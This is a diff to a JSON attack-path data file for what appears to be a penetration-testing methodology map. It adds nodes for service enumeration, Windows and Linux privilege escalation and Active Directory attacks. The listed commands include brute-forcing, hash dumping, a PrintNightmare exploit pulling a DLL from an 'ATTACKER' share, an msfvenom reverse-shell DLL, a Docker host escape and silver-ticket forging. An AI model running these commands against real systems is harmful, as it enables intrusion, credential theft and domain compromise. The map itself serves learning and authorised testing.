@@ -45,7 +45,14 @@
       "mysql-enum",
       "redis-enum",
       "dns-enum",
-      "snmp-enum"
+      "snmp-enum",
+      "ssh-enum",
+      "rdp-enum",
+      "kerberos-enum",
+      "ipmi-enum",
+      "postgresql-enum",
+      "rsync-enum",
+      "vnc-enum"
     ],
     "summary": "",
     "references": [],
@@ -79,7 +86,8 @@
     "tags": [
       "windows",
       "linux",
-      "web"
+      "web",
+      "dns"
     ],
     "tools": [
       "dig axfr @$TARGET $DOMAIN",
@@ -101,7 +109,8 @@
     "stage": "enumeration",
     "tags": [
       "windows",
-      "linux"
+      "linux",
+      "ftp"
     ],
     "tools": [
       "nmap -Pn -sV -p 21 --script=\"ftp*\" $TARGET",
@@ -118,12 +127,59 @@
     "filePath": "nodes/02-enum/ftp-enum.md"
   },
   {
+    "id": "ipmi-enum",
+    "title": "IPMI Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "linux",
+      "windows"
+    ],
+    "tools": [
+      "nmap -sU -p623 --script ipmi-version,ipmi-brute $TARGET",
+      "msfconsole → use auxiliary/scanner/ipmi/ipmi_dumphashes",
+      "ipmitool -I lanplus -H $TARGET -U admin -P admin chassis status",
+      "hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt"
+    ],
+    "leads_to": [
+      "password-spray",
+      "ssh-access"
+    ],
+    "summary": "Exploit IPMI 2.0 to dump password hashes or bypass authentication via Cipher 0.",
+    "references": [],
+    "filePath": "nodes/02-enum/ipmi-enum.md"
+  },
+  {
+    "id": "kerberos-enum",
+    "title": "Kerberos User Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "ad",
+      "kerberos"
+    ],
+    "tools": [
+      "kerbrute userenum -d domain.local --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC",
+      "impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $DC"
+    ],
+    "leads_to": [
+      "asreproast",
+      "kerberoast",
+      "password-spray",
+      "ldap-enum"
+    ],
+    "summary": "Enumerate valid domain users via Kerberos pre-authentication error differences — no credentials needed.",
+    "references": [],
+    "filePath": "nodes/02-enum/kerberos-enum.md"
+  },
+  {
     "id": "ldap-enum",
     "title": "LDAP Enumeration",
     "stage": "enumeration",
     "tags": [
       "windows",
-      "ad"
+      "ad",
+      "ldap"
     ],
     "tools": [
       "ldapsearch -H ldap://$TARGET -x -b \"\" -s base namingContexts",
@@ -145,7 +201,8 @@
     "title": "MSSQL Enumeration",
     "stage": "enumeration",
     "tags": [
-      "windows"
+      "windows",
+      "mssql"
     ],
     "tools": [
       "nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET",
@@ -167,7 +224,8 @@
     "stage": "enumeration",
     "tags": [
       "windows",
-      "linux"
+      "linux",
+      "mysql"
     ],
     "tools": [
       "mysql -h $TARGET -u root",
@@ -186,7 +244,8 @@
     "title": "NFS Enumeration",
     "stage": "enumeration",
     "tags": [
-      "linux"
+      "linux",
+      "nfs"
     ],
     "tools": [
       "showmount -e $TARGET",
@@ -202,11 +261,56 @@
     "filePath": "nodes/02-enum/nfs-enum.md"
   },
   {
+    "id": "postgresql-enum",
+    "title": "PostgreSQL Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "psql -h $TARGET -U postgres",
+      "nmap -p5432 --script pgsql-brute $TARGET",
+      "hydra -L users.txt -P passwords.txt postgres://$TARGET"
+    ],
+    "leads_to": [
+      "sqli-rce",
+      "rev-shell",
+      "public-exploit"
+    ],
+    "summary": "Enumerate PostgreSQL databases and escalate to OS command execution via COPY TO PROGRAM.",
+    "references": [],
+    "filePath": "nodes/02-enum/postgresql-enum.md"
+  },
+  {
+    "id": "rdp-enum",
+    "title": "RDP Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "rdp"
+    ],
+    "tools": [
+      "nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET",
+      "nxc rdp $TARGET",
+      "hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4"
+    ],
+    "leads_to": [
+      "rdp-access",
+      "password-spray",
+      "public-exploit"
+    ],
+    "summary": "Check NLA status, enumerate RDP encryption level, and test for known vulnerabilities.",
+    "references": [],
+    "filePath": "nodes/02-enum/rdp-enum.md"
+  },
+  {
     "id": "redis-enum",
     "title": "Redis Enumeration",
     "stage": "enumeration",
     "tags": [
-      "linux"
+      "linux",
+      "redis"
     ],
     "tools": [
       "redis-cli -h $TARGET ping",
@@ -220,6 +324,26 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/02-enum/redis-enum.md"
+  },
+  {
+    "id": "rsync-enum",
+    "title": "Rsync Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "rsync --list-only rsync://$TARGET/",
+      "rsync -av rsync://$TARGET/<module>/ ./loot/",
+      "nmap -p873 --script rsync-list-modules $TARGET"
+    ],
+    "leads_to": [
+      "ssh-access",
+      "rev-shell"
+    ],
+    "summary": "List and download Rsync modules for unauthenticated file access — SSH keys and configs are prime targets.",
+    "references": [],
+    "filePath": "nodes/02-enum/rsync-enum.md"
   },
   {
     "id": "smb-enum",
@@ -240,7 +364,8 @@
     "leads_to": [
       "null-session",
       "password-spray",
-      "public-exploit"
+      "public-exploit",
+      "printnightmare"
     ],
     "summary": "",
     "references": [],
@@ -252,7 +377,8 @@
     "stage": "enumeration",
     "tags": [
       "windows",
-      "linux"
+      "linux",
+      "smtp"
     ],
     "tools": [
       "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET",
@@ -272,7 +398,8 @@
     "stage": "enumeration",
     "tags": [
       "windows",
-      "linux"
+      "linux",
+      "snmp"
     ],
     "tools": [
       "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET",
@@ -285,6 +412,51 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/02-enum/snmp-enum.md"
+  },
+  {
+    "id": "ssh-enum",
+    "title": "SSH Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux",
+      "ssh"
+    ],
+    "tools": [
+      "nmap -p22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $TARGET",
+      "nc -nv $TARGET 22",
+      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4",
+      "nxc ssh $CIDR -u user -p password --continue-on-success"
+    ],
+    "leads_to": [
+      "ssh-access",
+      "password-spray",
+      "public-exploit"
+    ],
+    "summary": "Banner grab, enumerate auth methods, and brute-force credentials on SSH.",
+    "references": [],
+    "filePath": "nodes/02-enum/ssh-enum.md"
+  },
+  {
+    "id": "vnc-enum",
+    "title": "VNC Enumeration",
+    "stage": "enumeration",
+    "tags": [
+      "windows",
+      "linux"
+    ],
+    "tools": [
+      "nmap -p5900-5910 --script vnc-info,vnc-brute $TARGET",
+      "hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET",
+      "vncviewer $TARGET:5900"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "rdp-access"
+    ],
+    "summary": "Check VNC for unauthenticated access, null authentication, or weak single-password credentials.",
+    "references": [],
+    "filePath": "nodes/02-enum/vnc-enum.md"
   },
   {
     "id": "web-enum",
@@ -429,7 +601,8 @@
     ],
     "leads_to": [
       "rev-shell",
-      "password-spray"
+      "password-spray",
+      "windows-gpp-creds"
     ],
     "summary": "",
     "references": [],
@@ -461,6 +634,26 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/03-initial-access/password-spray.md"
+  },
+  {
+    "id": "printnightmare",
+    "title": "PrintNightmare (CVE-2021-1675 / 34527)",
+    "stage": "initial-access",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "impacket-rpcdump @$TARGET | grep -i print",
+      "python3 CVE-2021-1675.py domain/user:pass@$TARGET '\\\\ATTACKER\\share\\evil.dll",
+      "msfconsole → use exploit/windows/dcerpc/cve_2021_1675_printnightmare"
+    ],
+    "leads_to": [
+      "rev-shell",
+      "system-shell"
+    ],
+    "summary": "Exploit Windows Print Spooler RCE to load a malicious DLL as SYSTEM — works on unpatched DCs and workstations.",
+    "references": [],
+    "filePath": "nodes/03-initial-access/printnightmare.md"
   },
   {
     "id": "public-exploit",
@@ -571,7 +764,8 @@
     "title": "RDP Access",
     "stage": "foothold",
     "tags": [
-      "windows"
+      "windows",
+      "rdp"
     ],
     "tools": [
       "xfreerdp /u:user /p:password /v:$TARGET",
@@ -581,6 +775,9 @@
     "leads_to": [
       "token-impersonation",
       "windows-stored-creds",
+      "windows-dll-hijack",
+      "windows-uac-bypass",
+      "windows-gpp-creds",
       "bloodhound"
     ],
     "summary": "",
@@ -611,6 +808,11 @@
       "token-impersonation",
       "windows-service-misconfig",
       "windows-stored-creds",
+      "windows-dll-hijack",
+      "windows-uac-bypass",
+      "windows-gpp-creds",
+      "linux-docker-escape",
+      "linux-shared-lib",
       "bloodhound"
     ],
     "summary": "",
@@ -622,7 +824,8 @@
     "title": "SSH Access",
     "stage": "foothold",
     "tags": [
-      "linux"
+      "linux",
+      "ssh"
     ],
     "tools": [
       "ssh user@$TARGET",
@@ -636,7 +839,9 @@
       "linux-kernel",
       "linux-cred-hunting",
       "linux-pam-polkit",
-      "linux-path-hijack"
+      "linux-path-hijack",
+      "linux-docker-escape",
+      "linux-shared-lib"
     ],
     "summary": "",
     "references": [],
@@ -670,7 +875,8 @@
     "stage": "foothold",
     "tags": [
       "windows",
-      "ad"
+      "ad",
+      "winrm"
     ],
     "tools": [
       "evil-winrm -i $IP -u $USER -p $PASS",
@@ -683,6 +889,10 @@
       "windows-sebackup",
       "acl-abuse",
       "dcsync",
+      "kerberos-delegation",
+      "laps-abuse",
+      "windows-gpp-creds",
+      "windows-uac-bypass",
       "bloodhound"
     ],
     "summary": "",
@@ -771,7 +981,9 @@
       "adcs-esc1",
       "adcs-esc4",
       "dcsync",
-      "kerberoast"
+      "kerberoast",
+      "kerberos-delegation",
+      "laps-abuse"
     ],
     "summary": "",
     "references": [],
@@ -791,11 +1003,55 @@
     ],
     "leads_to": [
       "domain-admin",
-      "golden-ticket"
+      "golden-ticket",
+      "silver-ticket"
     ],
     "summary": "",
     "references": [],
     "filePath": "nodes/05-privesc/dcsync.md"
+  },
+  {
+    "id": "kerberos-delegation",
+    "title": "Kerberos Delegation Abuse",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad",
+      "kerberos"
+    ],
+    "tools": [
+      "impacket-findDelegation domain.local/user:pass -dc-ip $DC",
+      "Get-ADComputer -Filter {TrustedForDelegation -eq $true}",
+      "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/$TARGET"
+    ],
+    "leads_to": [
+      "domain-admin",
+      "system-shell"
+    ],
+    "summary": "Abuse Unconstrained, Constrained, or Resource-Based Constrained Delegation to impersonate privileged users and access services.",
+    "references": [],
+    "filePath": "nodes/05-privesc/kerberos-delegation.md"
+  },
+  {
+    "id": "laps-abuse",
+    "title": "LAPS & gMSA Abuse",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "crackmapexec smb $TARGET -u user -p pass -M laps",
+      "Get-ADComputer $TARGET -Properties ms-Mcs-AdmPwd",
+      "impacket-laps domain.local/user:pass -computer $TARGET -dc-ip $DC"
+    ],
+    "leads_to": [
+      "system-shell",
+      "domain-admin"
+    ],
+    "summary": "Read LAPS local admin passwords or gMSA service account passwords from Active Directory if you have the required permissions.",
+    "references": [],
+    "filePath": "nodes/05-privesc/laps-abuse.md"
   },
   {
     "id": "linux-cred-hunting",
@@ -835,6 +1091,25 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/05-privesc/linux-cron.md"
+  },
+  {
+    "id": "linux-docker-escape",
+    "title": "Docker Escape",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "find / -name docker.sock 2>/dev/null",
+      "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "capsh --print"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "Escape Docker containers via socket access, privileged mode, or exposed capabilities to gain root on the host.",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-docker-escape.md"
   },
   {
     "id": "linux-kernel",
@@ -893,6 +1168,25 @@
     "filePath": "nodes/05-privesc/linux-path-hijack.md"
   },
   {
+    "id": "linux-shared-lib",
+    "title": "Shared Library Hijacking",
+    "stage": "privesc",
+    "tags": [
+      "linux"
+    ],
+    "tools": [
+      "readelf -d /path/to/binary | grep rpath",
+      "ldd /path/to/binary",
+      "find / -writable -name \"*.so*\" 2>/dev/null"
+    ],
+    "leads_to": [
+      "root-linux"
+    ],
+    "summary": "Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths to execute code as a privileged user.",
+    "references": [],
+    "filePath": "nodes/05-privesc/linux-shared-lib.md"
+  },
+  {
     "id": "linux-sudo",
     "title": "Linux Sudo Abuse",
     "stage": "privesc",
@@ -948,6 +1242,48 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/05-privesc/token-impersonation.md"
+  },
+  {
+    "id": "windows-dll-hijack",
+    "title": "DLL Hijacking",
+    "stage": "privesc",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "procmon.exe (filter: PATH NOT FOUND + .dll)",
+      "msfvenom -p windows/x64/shell_reverse_tcp -f dll -o evil.dll",
+      "icacls \"C:\\path\\to\\dir"
+    ],
+    "leads_to": [
+      "system-shell",
+      "rev-shell"
+    ],
+    "summary": "Place a malicious DLL in a directory searched before the legitimate one to execute code in the context of a privileged process.",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-dll-hijack.md"
+  },
+  {
+    "id": "windows-gpp-creds",
+    "title": "GPP Credentials (MS14-025)",
+    "stage": "privesc",
+    "tags": [
+      "windows",
+      "ad"
+    ],
+    "tools": [
+      "Get-GPPPassword (PowerSploit)",
+      "impacket-Get-GPPPassword domain/user:pass@$DC",
+      "findstr /S /I cpassword \\\\$DC\\SYSVOL\\*.xml"
+    ],
+    "leads_to": [
+      "password-spray",
+      "system-shell",
+      "domain-admin"
+    ],
+    "summary": "Retrieve and decrypt AES-encrypted passwords stored in Group Policy Preference XML files on SYSVOL — key is publicly known.",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-gpp-creds.md"
   },
   {
     "id": "windows-sebackup",
@@ -1013,6 +1349,26 @@
     "filePath": "nodes/05-privesc/windows-stored-creds.md"
   },
   {
+    "id": "windows-uac-bypass",
+    "title": "UAC Bypass",
+    "stage": "privesc",
+    "tags": [
+      "windows"
+    ],
+    "tools": [
+      "fodhelper UAC bypass (registry hijack)",
+      "eventvwr UAC bypass (registry hijack)",
+      "UACME project"
+    ],
+    "leads_to": [
+      "system-shell",
+      "token-impersonation"
+    ],
+    "summary": "Bypass User Account Control to elevate from medium to high integrity without triggering a UAC prompt — requires local admin group membership.",
+    "references": [],
+    "filePath": "nodes/05-privesc/windows-uac-bypass.md"
+  },
+  {
     "id": "domain-admin",
     "title": "Domain Admin / Proof",
     "stage": "objective",
@@ -1045,7 +1401,8 @@
       "impacket-lookupsid $DOMAIN/user:password@$DC_IP 0"
     ],
     "leads_to": [
-      "domain-admin"
+      "domain-admin",
+      "silver-ticket"
     ],
     "summary": "",
     "references": [],
@@ -1092,6 +1449,27 @@
     "summary": "",
     "references": [],
     "filePath": "nodes/06-objective/root-linux.md"
+  },
+  {
+    "id": "silver-ticket",
+    "title": "Silver Ticket",
+    "stage": "objective",
+    "tags": [
+      "windows",
+      "ad",
+      "kerberos"
+    ],
+    "tools": [
+      "impacket-ticketer -spn cifs/$TARGET -domain-sid $SID -nthash $SERVICE_HASH -domain domain.local Administrator",
+      "mimikatz \"kerberos::golden /domain: /sid: /target: /service:cifs /rc4: /user:Administrator /ptt"
+    ],
+    "leads_to": [
+      "system-shell",
+      "pivot"
+    ],
+    "summary": "Forge a service ticket (TGS) using a service account's NTLM hash to access a specific service as any user — no DC contact required.",
+    "references": [],
+    "filePath": "nodes/06-objective/silver-ticket.md"
   },
   {
     "id": "system-shell",
